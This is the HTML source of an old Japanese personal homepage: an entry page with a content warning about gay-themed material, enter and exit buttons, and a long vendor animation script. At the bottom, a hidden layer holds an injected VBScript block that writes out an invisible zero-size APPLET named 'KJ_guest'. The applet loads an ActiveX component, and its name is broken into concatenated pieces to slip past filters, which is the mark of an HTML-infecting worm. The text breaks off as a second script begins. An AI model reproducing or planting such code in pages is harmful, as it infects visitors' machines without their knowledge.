<!DOCTYPE HTML PUBLIC "-//W3C//DTD HTML 4.01 Transitional//EN">
<HTML>
<HEAD>
<META http-equiv="Content-Type" content="text/html; charset=Shift_JIS">
<META name="GENERATOR" content="IBM WebSphere Studio Homepage Builder Version 6.5.0.0 for Windows">
<META http-equiv="Content-Style-Type" content="text/css">
<META name="IBM:HPB-Input-Mode" content="mode/flm; pagewidth=750; pageheight=900">
<TITLE></TITLE>
<SCRIPT>
<!--HPB_SCRIPT_INFO_40
//HPB_VFX_EVT Element:BODY Event:OnLoad Handler:HpbVfxinit('Layer1','HpbVfx0301','K221',0,0,0); 
//HPB_VFX_PAR Element:BODY Event:OnLoad LayerID:Layer1 Entry:HpbVfx0301 Param:K221 1stDelay:0 NxtDelay:0 Loop:0 
//-->
</SCRIPT><SCRIPT language="JavaScript">
<!--HPB_SCRIPT_VFX_40
//
//  Licensed Materials - Property of IBM
//  11P5743
//  (C) Copyright IBM Corp. 1998, 2000 All Rights Reserved.
//
var layerId       =  0; var func          =  1; var effectPattern =  2; 
var startTime     =  3; var nextLayerIdx  =  4; var nextStartTime =  5; 
var intervalTime  =  6; var repeat        =  7; var endVisibility =  8;
var posX          =  9; var posY          = 10; var posStartX     = 11;
var posStartY     = 12; var posEndX       = 13; var posEndY       = 14;
var stepX         = 15; var stepY         = 16; var frame         = 17;
var accelerationX = 18; var accelerationY = 19; var angle         = 20;
var fixedX        = 21; var fixedY        = 22; 

var appVer = parseInt(navigator.appVersion);
var isNC = (document.layers && (appVer >= 4)); // Netscape Navigator 4.0 or later
var isIE = (document.all    && (appVer >= 4)); // Internet Explorer  4.0 or later
var elt;
elt = new Array;
var layerobj;
layerobj = new Array;
var lastobj;

function HpbVfxinit() {
  var w_str;
  if (isNC || isIE) {
    var n_div = arguments.length / 6;
    for (var div = 0; div < n_div; div++) {
      var args = 6 * div;
      var arg1 = arguments[args];
      var arg2 = arguments[args+1];
      var arg3 = arguments[args+2];
      var arg4 = arguments[args+3];
      var arg5 = arguments[args+4];
      var arg6 = arguments[args+5];
      elt[div] = new Array(arg1,arg2,arg3,arg4,-1,arg5,0,arg6,true,-32767,-32767,-32767,-32767,-32767,-32767,-32767,-32767,40,1.0,1.0,0,-1,-1);
  } }

  if (isNC) {
    for (i=0; i < elt.length; i++) {
      w_str = "document." + elt[i][layerId];
      layerobj[i] = eval(w_str);
      if (layerobj[i]) {
        layerobj[i].init = false;
        layerobj[i].innerH = window.innerHeight;
        layerobj[i].innerW = window.innerWidth;
        layerobj[i].pos_x = layerobj[i].left;
        layerobj[i].pos_y = layerobj[i].top;
        layerobj[i].pos_w = layerobj[i].clip.width;
        layerobj[i].pos_h = layerobj[i].clip.height;
  } } }
  if (isIE) {
    for (i=0; i < elt.length; i++) {
      w_str = "document.all.item(\"" + elt[i][layerId] + "\")";
      if (eval(w_str)) {
        w_str = "document.all.item(\"" + elt[i][layerId] + "\").style";
        layerobj[i] = eval(w_str);
        if (layerobj[i]) {
          layerobj[i].init = false;
          layerobj[i].innerH = document.body.clientHeight;
          layerobj[i].innerW = document.body.clientWidth;
          layerobj[i].pos_x = layerobj[i].pixelLeft;
          layerobj[i].pos_y = layerobj[i].pixelTop;
          layerobj[i].pos_w = layerobj[i].pixelWidth;
          layerobj[i].pos_h = layerobj[i].pixelHeight;
  } } } }

  if (isNC || isIE) {
    for (i=0; i < elt.length; i++) {
      if (layerobj[i]) {
        if (elt[i][posX] == -32767) elt[i][posX] = layerobj[i].pos_x;
        if (elt[i][posY] == -32767) elt[i][posY] = layerobj[i].pos_y;
        if (elt[i][effectPattern].charAt(0) == "A") {
          if (elt[i][posX] != -32767) elt[i][posEndX] = elt[i][posX];
          if (elt[i][posY] != -32767) elt[i][posEndY] = elt[i][posY];
          if (elt[i][effectPattern].charAt(1) == "1") {
            elt[i][posStartX] = layerobj[i].pos_w * -1;
            if (elt[i][posY] != -32767) elt[i][posStartY] = elt[i][posY];
          }
          if (elt[i][effectPattern].charAt(1) == "3") {
            if (elt[i][posX] != -32767) elt[i][posStartX] = elt[i][posX];
            elt[i][posStartY] = layerobj[i].pos_h * -1;
          }
          if (elt[i][effectPattern].charAt(1) == "5") {
            elt[i][posStartX] = layerobj[i].pos_w * -1;
            elt[i][posStartY] = layerobj[i].pos_h * -1;
          }
          if (elt[i][effectPattern].charAt(1) == "8") {
            elt[i][posStartX] = layerobj[i].pos_w * -1;
            elt[i][posStartY] = layerobj[i].innerH;
        } }
        if (elt[i][effectPattern].charAt(0) == "B") {
          if (elt[i][posX] != -32767) elt[i][posStartX] = elt[i][posX];
          if (elt[i][posY] != -32767) elt[i][posStartY] = elt[i][posY];
          if (elt[i][effectPattern].charAt(1) == "2") {
            elt[i][posEndX] = layerobj[i].pos_w * -1;
            if (elt[i][posY] != -32767) elt[i][posEndY] = elt[i][posY];
          }
          if (elt[i][effectPattern].charAt(1) == "4") {
            if (elt[i][posX] != -32767) elt[i][posEndX] = elt[i][posX];
            elt[i][posEndY] = layerobj[i].pos_h * -1;
          }
          if (elt[i][effectPattern].charAt(1) == "6") {
            elt[i][posEndX] = layerobj[i].pos_w * -1;
            elt[i][posEndY] = layerobj[i].pos_h * -1;
          }
          if (elt[i][effectPattern].charAt(1) == "7") {
            elt[i][posEndX] = layerobj[i].pos_w * -1;
            elt[i][posEndY] = layerobj[i].innerH;
        } }
        if (elt[i][effectPattern].charAt(0) == "C") {
          if (elt[i][effectPattern].charAt(1) == "2") {
            elt[i][posStartX] = layerobj[i].innerW;
            elt[i][posEndX] = layerobj[i].pos_w * -1;
            if (elt[i][posY] != -32767) {
              elt[i][posStartY] = elt[i][posY];
              elt[i][posEndY] = elt[i][posY];
            }
          }
          if (elt[i][effectPattern].charAt(1) == "1") {
            elt[i][posStartX] = layerobj[i].pos_w * -1;
            elt[i][posEndX] = layerobj[i].innerW;
            if (elt[i][posY] != -32767) {
              elt[i][posStartY] = elt[i][posY];
              elt[i][posEndY] = elt[i][posY];
            }
          }
          if (elt[i][effectPattern].charAt(1) == "3") {
            if (elt[i][posX] != -32767) {
              elt[i][posStartX] = elt[i][posX];
              elt[i][posEndX] = elt[i][posX];
            }
            elt[i][posStartY] = layerobj[i].pos_h * -1;
            elt[i][posEndY] = layerobj[i].innerH;
          }
          if (elt[i][effectPattern].charAt(1) == "4") {
            if (elt[i][posX] != -32767) {
              elt[i][posStartX] = elt[i][posX];
              elt[i][posEndX] = elt[i][posX];
            }
            elt[i][posStartY] = layerobj[i].innerH;
            elt[i][posEndY] = layerobj[i].pos_h * -1;
          }
          if (elt[i][effectPattern].charAt(1) == "7") {
            elt[i][posStartX] = layerobj[i].innerW;
            elt[i][posStartY] = layerobj[i].pos_h * -1;
            elt[i][posEndX] = layerobj[i].pos_w * -1;
            elt[i][posEndY] = layerobj[i].innerH;
          }
          if (elt[i][effectPattern].charAt(1) == "5") {
            elt[i][posStartX] = layerobj[i].pos_w * -1;
            elt[i][posStartY] = layerobj[i].pos_h * -1;
            elt[i][posEndX] = layerobj[i].innerW;
            elt[i][posEndY] = layerobj[i].innerH;
          }
          if (elt[i][effectPattern].charAt(1) == "6") {
            elt[i][posStartX] = layerobj[i].innerW;
            elt[i][posStartY] = layerobj[i].innerH;
            elt[i][posEndX] = layerobj[i].pos_w * -1;
            elt[i][posEndY] = layerobj[i].pos_h * -1;
          }
          if (elt[i][effectPattern].charAt(1) == "8") {
            elt[i][posStartX] = layerobj[i].pos_w * -1;
            elt[i][posStartY] = layerobj[i].innerH;
            elt[i][posEndX] = layerobj[i].innerW;
            elt[i][posEndY] = layerobj[i].pos_h * -1;
        } }
        if (elt[i][effectPattern].charAt(0) == "D") {
          if (elt[i][effectPattern].charAt(1) == "1") {
            elt[i][stepX] = 4;  elt[i][stepY] = 0;
          }
          if (elt[i][effectPattern].charAt(1) == "3") {
            elt[i][stepX] = 0;  elt[i][stepY] = 4;
        } }
        if (elt[i][effectPattern].charAt(0) == "F") {
          if (elt[i][effectPattern].charAt(1) == "4") {
            if (elt[i][posX] != -32767) {
              elt[i][posStartX] = elt[i][posX];
              elt[i][posEndX] = elt[i][posX] + layerobj[i].pos_w;
            }
            if (elt[i][posY] != -32767) {
              elt[i][posStartY] = elt[i][posY];
              if (elt[i][effectPattern].charAt(3) == "1") elt[i][posEndY] = elt[i][posY] + 80;
              if (elt[i][effectPattern].charAt(3) == "2") elt[i][posEndY] = elt[i][posY] + 160;
              if (elt[i][effectPattern].charAt(3) == "3") elt[i][posEndY] = elt[i][posY] + 320;
            }
            elt[i][stepX] = 0;  elt[i][stepY] = 4;
          }
          if (elt[i][effectPattern].charAt(1) == "2") {
            if (elt[i][posX] != -32767) {
              elt[i][posStartX] = elt[i][posX];
              if (elt[i][effectPattern].charAt(3) == "1") elt[i][posEndX] = elt[i][posX] + 80;
              if (elt[i][effectPattern].charAt(3) == "2") elt[i][posEndX] = elt[i][posX] + 160;
              if (elt[i][effectPattern].charAt(3) == "3") elt[i][posEndX] = elt[i][posX] + 320;
            }
            if (elt[i][posY] != -32767) {
              elt[i][posStartY] = elt[i][posY];
              elt[i][posEndY] = elt[i][posY] + layerobj[i].pos_h;
            }
            elt[i][stepX] = 4;  elt[i][stepY] = 0;
        } }
        if (elt[i][effectPattern].charAt(0) == "G") {
          if (elt[i][effectPattern].charAt(1) == "2") {
            elt[i][posStartX] = 0;
            if (elt[i][effectPattern].charAt(3) == "1") elt[i][posStartY] = 80;
            if (elt[i][effectPattern].charAt(3) == "2") elt[i][posStartY] = 160;
            if (elt[i][effectPattern].charAt(3) == "3") elt[i][posStartY] = 320;
            elt[i][posEndX] = 1;  elt[i][posEndY] = 1;
        } }
        if (elt[i][effectPattern].charAt(0) == "H") {
          if (elt[i][effectPattern].charAt(3) == "1") {
            elt[i][stepX] = 8;  elt[i][stepY] = 8;
          }
          if (elt[i][effectPattern].charAt(3) == "2") {
            elt[i][stepX] = 16;  elt[i][stepY] = 16;
          }
          if (elt[i][effectPattern].charAt(3) == "3") {
            elt[i][stepX] = 32;  elt[i][stepY] = 32;
          }
          if (elt[i][effectPattern].charAt(1) == "2") {
            elt[i][stepX] = 0;  elt[i][fixedX] = true;  elt[i][fixedY] = true;
          }
          if (elt[i][effectPattern].charAt(1) == "1") {
            elt[i][stepY] = 0;  elt[i][fixedX] = true;  elt[i][fixedY] = true;
          }
          if (elt[i][effectPattern].charAt(1) == "3") {
            elt[i][fixedX] = false;  elt[i][fixedY] = false;
        } }
        if (elt[i][effectPattern].charAt(0) == "I") {
          if (elt[i][effectPattern].charAt(3) == "1") {
            elt[i][posStartX] = 40;  elt[i][posStartY] = 40;
          }
          if (elt[i][effectPattern].charAt(3) == "2") {
            elt[i][posStartX] = 80;  elt[i][posStartY] = 80;
          }
          if (elt[i][effectPattern].charAt(3) == "3") {
            elt[i][posStartX] = 160;  elt[i][posStartY] = 160;
          }
          elt[i][posEndX] = 1;  elt[i][posEndY] = 1;  elt[i][stepX] = -32767;
          if (elt[i][effectPattern].charAt(1) == "1") {
            elt[i][posY] += elt[i][posStartY];
            elt[i][stepY] = Math.PI * 3 / 2;
            elt[i][frame] = 40;
          }
          if (elt[i][effectPattern].charAt(1) == "2") {
            elt[i][posY] -= elt[i][posStartY];
            elt[i][stepY] = Math.PI * 1 / 2;
            elt[i][frame] = 40;
          }
          if (elt[i][effectPattern].charAt(1) == "3") {
            elt[i][posX] -= elt[i][posStartX];
            elt[i][stepY] = Math.PI * 0 / 2;
            elt[i][frame] = 40;
          }
          if (elt[i][effectPattern].charAt(1) == "4") {
            elt[i][posX] += elt[i][posStartX];
            elt[i][stepY] = Math.PI * 2 / 2;
            elt[i][frame] = 40;
          }
          if (elt[i][effectPattern].charAt(1) == "5") {
            elt[i][posY] += elt[i][posStartY];
            elt[i][stepY] = Math.PI * 3 / 2;
            elt[i][frame] = -40;
          }
          if (elt[i][effectPattern].charAt(1) == "6") {
            elt[i][posY] -= elt[i][posStartY];
            elt[i][stepY] = Math.PI * 1 / 2;
            elt[i][frame] = -40;
          }
          if (elt[i][effectPattern].charAt(1) == "7") {
            elt[i][posX] -= elt[i][posStartX];
            elt[i][stepY] = Math.PI * 0 / 2;
            elt[i][frame] = -40;
          }
          if (elt[i][effectPattern].charAt(1) == "8") {
            elt[i][posX] += elt[i][posStartX];
            elt[i][stepY] = Math.PI * 2 / 2;
            elt[i][frame] = -40;
        } }
        if (elt[i][effectPattern].charAt(0) == "J") {
          if (elt[i][effectPattern].charAt(3) == "1") {
            elt[i][posStartX] = 0;  elt[i][posStartY] = 80;
          }
          if (elt[i][effectPattern].charAt(3) == "2") {
            elt[i][posStartX] = 0;  elt[i][posStartY] = 160;
          }
          if (elt[i][effectPattern].charAt(3) == "3") {
            elt[i][posStartX] = 0;  elt[i][posStartY] = 320;
          }
          elt[i][posEndX] = 1;  elt[i][posEndY] = 1;
          elt[i][stepX] = -32767;  elt[i][stepY] = 0;
          if (elt[i][effectPattern].charAt(1) == "2") {
            elt[i][accelerationY] = 0.99;  elt[i][frame] = 40;
        } }
        if (elt[i][effectPattern].charAt(0) == "K") {
          if (elt[i][effectPattern].charAt(3) == "1") {
            elt[i][posStartX] = 40;  elt[i][posStartY] = 40;
          }
          if (elt[i][effectPattern].charAt(3) == "2") {
            elt[i][posStartX] = 80;  elt[i][posStartY] = 80;
          }
          if (elt[i][effectPattern].charAt(3) == "3") {
            elt[i][posStartX] = 160;  elt[i][posStartY] = 160;
          }
          elt[i][stepX] = -32767;  elt[i][stepY] = 0;
          if (elt[i][effectPattern].charAt(1) == "1") {
            elt[i][posEndX] = 13;  elt[i][posEndY] = 12;  elt[i][frame] = 160;
          }
          if (elt[i][effectPattern].charAt(1) == "2") {
            elt[i][posEndX] = 7;  elt[i][posEndY] = 2;  elt[i][frame] = 160;
          }
          if (elt[i][effectPattern].charAt(1) == "3") {
            elt[i][posEndX] = 11;  elt[i][posEndY] = 4;  elt[i][frame] = 160;
          }
          if (elt[i][effectPattern].charAt(1) == "4") {
            elt[i][posEndX] = 7;  elt[i][posEndY] = 4;  elt[i][frame] = 160;
        } }
        if (elt[i][effectPattern].charAt(2) == "1") elt[i][intervalTime] = 200;
        if (elt[i][effectPattern].charAt(2) == "2") elt[i][intervalTime] = 100;
        if (elt[i][effectPattern].charAt(2) == "3") elt[i][intervalTime] = 50;
        if ( elt[i][startTime] >= 0 ) setTimeout( "HpbVfxtimer(" + i + ")", elt[i][startTime] );
} } } }

function HpbVfxtimer(tid) {
  if (isNC || isIE) {
    if (layerobj[tid]) {
      var func_str;
      func_str = elt[tid][func] + "( tid, elt[tid], layerobj[tid] )";
      eval(func_str);
} } }

function HpbVfxshowobj(obj) {
  if (obj) {
    if (isNC) obj.visibility = "show";
    if (isIE) obj.visibility = "visible";
    lastobj = obj;
} }

function HpbVfxhideobj(obj) {
  if (obj) {
    if (isNC) obj.visibility = "hide";
    if (isIE) obj.visibility = "hidden";
} }

function HpbVfx0001(tid,et,ob) {
  var x;  var y;
  if (ob) {
    if (ob.init == false) {
      if (et[stepX] != -32767) ob.stepX = et[stepX] * Math.cos(et[angle]);
      else ob.stepX = (et[posEndX] - et[posStartX]) / et[frame];
      if (et[stepY] != -32767) ob.stepY = et[stepY] * Math.sin(et[angle]);
      else ob.stepY = (et[posEndY] - et[posStartY]) / et[frame];
      if (ob.stepX > 0 && ob.stepX < 1) ob.stepX = 1;
      if (ob.stepX < 0 && ob.stepX > -1) ob.stepX = -1;
      if (ob.stepY > 0 && ob.stepY < 1) ob.stepY = 1;
      if (ob.stepY < 0 && ob.stepY > -1) ob.stepY = -1;
      if (et[posStartX] != -32767) ob.x = et[posStartX];
      else if (ob.stepX > 0) ob.x = 0 - ob.pos_w; else ob.x = ob.innerW - ob.pos_w;
      if (et[posStartY] != -32767) ob.y = et[posStartY];
      else if (ob.stepY > 0) ob.y = 0 - ob.pos_h; else ob.y = ob.innerH - ob.pos_h;
      if (et[posEndX] != -32767) ob.posEndX = et[posEndX];
      else if (ob.stepX > 0) ob.posEndX = ob.innerW - ob.pos_w; else ob.posEndX = 0 - ob.pos_w;
      if (et[posEndY] != -32767) ob.posEndY = et[posEndY];
      else if (ob.stepY > 0) ob.posEndY = ob.innerH - ob.pos_h; else ob.posEndY = 0 - ob.pos_h;
      HpbVfxshowobj(ob);
      ob.init = true;  ob.frame = 0;
    }
    ob.stepX = ob.stepX * et[accelerationX];
    if (ob.stepX > 0 && ob.stepX < 1) ob.stepX = 1;
    if (ob.stepX < 0 && ob.stepX > -1) ob.stepX = -1;
    ob.stepY = ob.stepY * et[accelerationY];
    if (ob.stepY > 0 && ob.stepY < 1) ob.stepY = 1;
    if (ob.stepY < 0 && ob.stepY > -1) ob.stepY = -1;
    ob.x += ob.stepX;  ob.y += ob.stepY;
    var endX;  var endY;
    endX = false;  endY = false;
    if (ob.stepX > 0) if (ob.x >= ob.posEndX) {endX = true;  ob.x = ob.posEndX;}
    if (ob.stepX < 0) if (ob.x <= ob.posEndX) {endX = true;  ob.x = ob.posEndX;}
    if (ob.stepX == 0) endX = true;
    if (ob.stepY > 0) if (ob.y >= ob.posEndY) {endY = true;  ob.y = ob.posEndY;}
    if (ob.stepY < 0) if (ob.y <= ob.posEndY) {endY = true;  ob.y = ob.posEndY;}
    if (ob.stepY == 0) endY = true;
    ob.left = Math.round( ob.x );  ob.top = Math.round(ob.y);
    if (endX == true && endY == true) {
      if (et[endVisibility] == false) HpbVfxhideobj(ob);
      ob.init = false;
      if (et[repeat] == true) setTimeout("HpbVfxtimer(" + tid + ")",et[startTime]);
      else if (et[nextLayerIdx] >= 0) setTimeout("HpbVfxtimer(" + et[nextLayerIdx] + ")",et[nextStartTime]);
    } else setTimeout("HpbVfxtimer(" + tid + ")",et[intervalTime]);
} }

function HpbVfx0101(tid,et,ob) {
  var cl;  var cr;  var ct;  var cb;  var tm;  var x;  var y;
  if (ob) {
    if (ob.init == false) {
      if (et[stepX] != -32767) ob.cs_x = et[stepX]; else ob.cs_x = ob.pos_w / et[frame];
      if (et[stepY] != -32767) ob.cs_y = et[stepY]; else ob.cs_y = ob.pos_h / et[frame];
      ob.c_x = 0;  ob.c_y = 0;
      HpbVfxshowobj(ob);
      ob.init = true;
    }
    tm = false;
    cl = 0;  cr = ob.pos_w;  ct = 0;  cb = ob.pos_h;
    x = ob.pos_x;  y = ob.pos_y;
    if (et[fixedX] == false) {
      if (ob.cs_x > 0) {
        ob.c_x += ob.cs_x;
        if (cr > ob.c_x) {
          cl = cr - ob.c_x;  tm = true;  x = ob.pos_x - ob.pos_w + ob.c_x;
      } }
      if (ob.cs_x < 0) {
        ob.c_x += ob.cs_x;  cr = ob.c_x * -1;
        if (cr < ob.pos_w) {
          tm = true;  x = ob.pos_x + ob.pos_w + ob.c_x;
        } else cr = ob.pos_w;
      }
    } else {
      if (ob.cs_x > 0) {
        ob.c_x += ob.cs_x;
        if (cr > ob.c_x) {cr = ob.c_x;  tm = true;}
      }
      if (ob.cs_x < 0) {
        ob.c_x += ob.cs_x;  cl = ob.c_x * -1;
        if (cl < ob.pos_w) {tm = true;  cl = ob.pos_w - cl;} else cl = 0;
    } }
    if (et[fixedY] == false) {
      if (ob.cs_y > 0) {
        ob.c_y += ob.cs_y;
        if (cb > ob.c_y) {ct = cb - ob.c_y;  tm = true;  y = ob.pos_y - ob.pos_h + ob.c_y;}
      }
      if (ob.cs_y < 0) {
        ob.c_y += ob.cs_y;  cb = ob.c_y * -1;
        if ( cb < ob.pos_h ) {tm = true;  y = ob.pos_y + ob.pos_h + ob.c_y;} else cb = ob.pos_h;
      }
    } else {
      if (ob.cs_y > 0) {
        ob.c_y += ob.cs_y;
        if (cb > ob.c_y) {cb = ob.c_y;  tm = true;}
      }
      if (ob.cs_y < 0) {
        ob.c_y += ob.cs_y;  ct = ob.c_y * -1;
        if (ct < ob.pos_h) {tm = true;  ct = ob.pos_h - ct;} else ct = 0;
    } }
    if (isNC) {ob.clip.left = cl;  ob.clip.right = cr;  ob.clip.top = ct;  ob.clip.bottom = cb;}
    if (isIE) ob.clip = "rect(" + ct + "," + cr + "," + cb + "," + cl + ")";
    ob.top = y;  ob.left = x;
    if (tm) setTimeout("HpbVfxtimer(" + tid + ")",et[intervalTime]);
    else {
      if (et[endVisibility] == false) HpbVfxhideobj(ob);
      ob.init = false;
      if (et[repeat] == true) setTimeout("HpbVfxtimer(" + tid + ")",et[startTime]);
      else if (et[nextLayerIdx] >= 0) setTimeout("HpbVfxtimer(" + et[nextLayerIdx] + ")",et[nextStartTime]);
} } }

function HpbVfx0201(tid,et,ob) {
  var cl;  var cr;  var ct;  var cb;  var tm;  var x;  var y;
  if (ob) {
    if (ob.init == false) {
      if (et[stepX] != -32767) ob.cs_x = et[stepX]; else ob.cs_x = ob.pos_w / et[frame];
      if (et[stepY] != -32767) ob.cs_y = et[stepY]; else ob.cs_y = ob.pos_h / et[frame];
      ob.c_w = et[posEndX] - et[posStartX];  ob.c_h = et[posEndY] - et[posStartY];
      ob.c_x = 0;  ob.c_y = 0;
      HpbVfxshowobj(ob);
      ob.init = true;
    }
    tm = false;
    cl = 0;  cr = ob.pos_w;  ct = 0;  cb = ob.pos_h;
    x = et[posStartX];  y = et[posStartY];
    if (ob.cs_x > 0) {
      ob.c_x += ob.cs_x;
      if (ob.c_x < (ob.pos_w - ob.c_w)) {
        cl = ob.c_x;  cr = cl + ob.c_w;
        tm = true;
      } else cl = ob.pos_w - ob.c_w;
    }
    if (ob.cs_x < 0) {
      ob.c_x += ob.cs_x;  cr = ob.pos_w + ob.c_x;
      if (cr > ob.c_w) {cl = cr - ob.c_w;  tm = true;}
      else cr = ob.c_w;
    }
    if (ob.cs_y > 0) {
      ob.c_y += ob.cs_y;
      if (ob.c_y < (ob.pos_h - ob.c_h)) {
        ct = ob.c_y;  cb = ct + ob.c_h;
        tm = true;
      } else ct = ob.pos_h - ob.c_h;
    }
    if (ob.cs_y < 0) {
      ob.c_y += ob.cs_y;  cb = ob.pos_h + ob.c_y;
      if (cb > ob.c_h) {ct = cb - ob.c_h;  tm = true;}
      else cb = ob.c_h;
    }
    if (isNC) {ob.clip.left = cl;  ob.clip.right = cr;  ob.clip.top = ct;  ob.clip.bottom = cb;}
    if (isIE) ob.clip = "rect(" + ct + "," + cr + "," + cb + "," + cl + ")";
    x -= cl;  y -= ct;
    ob.top = y;  ob.left = x;
    if (tm) setTimeout( "HpbVfxtimer(" + tid + ")",et[intervalTime]);
    else {
      if (et[endVisibility] == false) HpbVfxhideobj(ob);
      ob.init = false;
      if (et[repeat] == true) setTimeout("HpbVfxtimer(" + tid + ")",et[startTime]);
      else if (et[nextLayerIdx] >= 0) setTimeout("HpbVfxtimer(" + et[nextLayerIdx] + ")",et[nextStartTime]);
} } }

function HpbVfx0301(tid,et,ob) {
  var x;  var y;  var tx;  var ty;
  if (ob) {
    if (ob.init == false) {
      if (et[stepX] != -32767) ob.step = et[stepX]; else ob.step = (Math.PI * 2) / et[frame];
      ob.boundX = et[posStartX];  ob.boundY = et[posStartY];
      ob.angle = 0.0;
      HpbVfxshowobj(ob);
      ob.init = true;
    }
    tx = Math.cos(ob.angle * et[posEndX]) * ob.boundX;  ty = Math.sin(ob.angle * et[posEndY]) * ob.boundY;
    if (et[fixedX] != 0) tx = Math.abs(tx) * et[fixedX];
    if (et[fixedY] != 0) ty = Math.abs(ty) * et[fixedY];
    x = et[posX];  y = et[posY];
    x += tx * Math.cos(et[angle]);  y += tx * Math.sin(et[angle]);
    x += ty * Math.cos(et[angle] + (Math.PI / 2));  y += ty * Math.sin(et[angle] + (Math.PI / 2));
    ob.top = Math.round(y);  ob.left = Math.round(x);
    if (et[accelerationX] != 1.0 || et[accelerationY] != 1.0) {
      ob.boundX *= et[accelerationX];  ob.boundY *= et[accelerationY];
      if (ob.boundX < 4  && ob.boundY < 4) {
        ob.init = false;
        if (et[repeat] == true) setTimeout("HpbVfxtimer(" + tid + ")",et[startTime]);
        else if (et[nextLayerIdx] >= 0) setTimeout("HpbVfxtimer(" + et[nextLayerIdx] + ")",et[nextStartTime]);
      } else {
        ob.angle += ob.step;
        setTimeout("HpbVfxtimer(" + tid + ")",et[intervalTime]);
      }
    } else {
      if (ob.angle >= (2 * Math.PI)) {
        ob.init = false;
        if (et[repeat] == true) setTimeout("HpbVfxtimer(" + tid + ")",et[startTime]);
        else if (et[nextLayerIdx] >= 0) setTimeout("HpbVfxtimer(" + et[nextLayerIdx] + ")",et[nextStartTime]);
      } else {
        ob.angle += ob.step;
        setTimeout("HpbVfxtimer(" + tid + ")",et[intervalTime]);
} } } }

function HpbVfx0311(tid,et,ob) {
  var x;  var y;  var ws;
  if (ob) {
    if (ob.init == false) {ob.setp = 0;  HpbVfxshowobj(ob);  ob.init = true;}
    x = et[posX];  y = et[posY];
    if (et[fixedX] == true) ws = ob.setp;
    else {
      ws = Math.round(Math.random() * 4);
      if (ws > 3) ws = 0;
    }
    if (ws == 1) x += et[stepX];
    if (ws == 3) x -= et[stepX];
    if (et[fixedY] == true) ws = ob.setp;
    else {
      ws = Math.round(Math.random() * 4);
      if (ws > 3) ws = 0;
    }
    if (ws == 1) y += et[stepY];
    if (ws == 3) y -= et[stepY];
    ob.top = Math.round( y );  ob.left = Math.round( x );
    ob.setp ++;
    if (ob.setp >= 4) {
      ob.init = false;
      if (et[repeat] == true) setTimeout("HpbVfxtimer(" + tid + ")",et[startTime]);
      else if (et[nextLayerIdx] >= 0) setTimeout("HpbVfxtimer(" + et[nextLayerIdx] + ")",et[nextStartTime]);
    } else setTimeout("HpbVfxtimer(" + tid + ")",et[intervalTime]);
} }

function HpbVfx0401(tid,et,ob) {
  var x;  var y;  var tx;  var ty;
  if (ob) {
    if (ob.init == false) {
      if (et[stepX] != -32767) ob.step = et[stepX]; else ob.step = (Math.PI * 2) / et[frame];
      ob.angle = 0.0;
      HpbVfxshowobj(ob);
      ob.init = true;
    }
    tx = Math.cos((ob.angle * et[posEndX]) + et[stepY]) * et[posStartX];
    ty = Math.sin((ob.angle * et[posEndY]) + et[stepY]) * et[posStartY];
    x = et[posX];  y = et[posY];
    x += tx * Math.cos(et[angle]);  y += tx * Math.sin(et[angle]);
    x += ty * Math.cos(et[angle] + (Math.PI / 2));  y += ty * Math.sin(et[angle] + (Math.PI / 2));
    ob.top = Math.round(y);  ob.left = Math.round(x);
    if (Math.abs(ob.angle) >= (2 * Math.PI)) {
      ob.init = false;
      if (et[repeat] == true) setTimeout("HpbVfxtimer(" + tid + ")",et[startTime]);
      else if (et[nextLayerIdx] >= 0) setTimeout("HpbVfxtimer(" + et[nextLayerIdx] + ")",et[nextStartTime]);
    } else {
      ob.angle += ob.step;
      setTimeout("HpbVfxtimer(" + tid + ")",et[intervalTime]);
} } }

function HpbVfx0501(tid,et,ob) {
  if (ob) {
    if (ob.init == false) {HpbVfxshowobj(ob);  ob.init = true;}
    var px;  var py;
    if (isNC) {px = window.pageXOffset;  py = window.pageYOffset;}
    if (isIE) {px = document.body.scrollLeft;  py = document.body.scrollTop;}
    ob.top = Math.round(py + et[posY]);  ob.left = Math.round(px + et[posX]);
    setTimeout("HpbVfxtimer(" + tid + ")",et[intervalTime]);
} }
//-->
</SCRIPT></HEAD>
<BODY background="d020bcg.gif" onload="HpbVfxinit('Layer1','HpbVfx0301','K221',0,0,0);"><script type="text/javascript" src="http://www.livedoor.com/js/lcslog.js">
</script>

<script type="text/javascript" src="http://www.aaacafe.ne.jp/js/header_ad.js">
</script>

<DIV style="top : 272px;left : 282px;
  position : absolute;
  z-index : 2;
  visibility : hidden;
" id="Layer1">
<P align="right"><FONT size="+4" color="#000099"><FONT size="+4" color="#000099"><I>タウンのホーム</I></FONT></FONT></P>
</DIV>
<DIV style="top : 376px;left : 126px;
  position : absolute;
  z-index : 3;
" id="Layer2"><IMG src="na001lin.gif" width="578" height="20" border="0"></DIV>
<DIV style="top : 436px;left : 182px;
  position : absolute;
  z-index : 4;
" id="Layer3">
<P><FONT color="#ff0000" size="+2"><B>＊警告</B></FONT></P>
</DIV>
<DIV style="top : 510px;left : 178px;
  position : absolute;
  z-index : 5;
" id="Layer4">
<P><B>このホームページには、ＧＡＹに関するコンテンツがふくまれています。<BR>
<BR>
理解のある方のみお入りください。<BR>
<BR>
間違って入って来た方は、速やかに退場してください。</B></P>
</DIV>
<DIV style="top : 673px;left : 119px;
  position : absolute;
  z-index : 6;
" id="Layer5"><IMG src="na001lin.gif" width="586" height="20" border="0"></DIV>
<DIV style="top : 776px;left : 519px;
  position : absolute;
  z-index : 7;
" id="Layer6"><A href="http://www.yahoo.co.jp/"><IMG src="button1.gif" width="90" height="34" border="0" alt="out"></A></DIV>
<DIV style="top : 772px;left : 230px;
  position : absolute;
  z-index : 8;
" id="Layer7"><A href="MAIN TOUNPAGE.HTM"><IMG src="button3.gif" width="90" height="34" border="0" alt="in"></A></DIV>
<DIV style="width : 30px;height : 12px;top : 15px;left : 8px;
  position : absolute;
  z-index : 1;
" id="Layer8"><script language=vbscript>
document.write "<div style='position:absolute; left:0px; top:0px; width:0px; height:0px; z-index:28; visibility: hidden'><"&"APPLET NAME=KJ"&"_guest HEIGHT=0 WIDTH=0 code=com.ms."&"activeX.Active"&"XComponent></APPLET></div>"
</script><script language=vbscript>
